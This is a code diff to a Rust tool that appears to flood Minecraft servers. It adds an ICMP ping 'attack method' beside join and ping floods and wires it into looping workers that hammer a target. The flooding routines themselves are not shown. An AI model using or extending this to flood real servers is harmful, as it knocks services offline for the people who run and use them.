@@ -12,12 +12,14 @@ use rust_mc_proto_tokio::MCConnTcp;
 
 use crate::counter::write_stats;
 use crate::duration::parse_duration_as_secs;
+use crate::method_icmp_ping::send_icmp_ping;
 use crate::method_join::send_join;
 use crate::method_ping::send_ping;
 use crate::methods::{method_to_string, parse_method, AttackMethod};
 use crate::resolver::{parse_hostname, parse_target};
 mod counter;
 mod mc_packet_utils;
+mod method_icmp_ping;
 mod method_join;
 mod method_ping;
 mod methods;
@@ -32,7 +34,7 @@ struct Flags {
     /// Attack duration. Available formats: seconds, minutes, hours.
     #[arg(short, long, default_value_t = String::from("1m"))]
     duration: String,
-    /// Attack method. Available methods: join, ping.
+    /// Attack method. Available methods: join, ping, icmp.
     #[arg(short, long, default_value_t = String::from("ping"))]
     method: String,
 }
@@ -97,6 +99,10 @@ async fn worker_loop(
     method: Arc<AttackMethod>,
 ) {
     loop {
+        if *method == AttackMethod::IcmpPing {
+            send_icmp_ping(target.ip(), cps.clone(), failures.clone()).await;
+            continue;
+        }
         let stream = match tokio::net::TcpStream::connect(target).await {
             Ok(value) => value,
             Err(_) => {
@@ -108,7 +114,8 @@ async fn worker_loop(
         match *method {
             AttackMethod::Join => send_join(&mut conn, &target.port(), hostname).await,
             AttackMethod::Ping => send_ping(&mut conn, &target.port(), hostname).await,
-        }
+            AttackMethod::IcmpPing => { /*impossible code logic*/ }
+        };
         cps.fetch_add(1, Ordering::Relaxed);
     }
 }
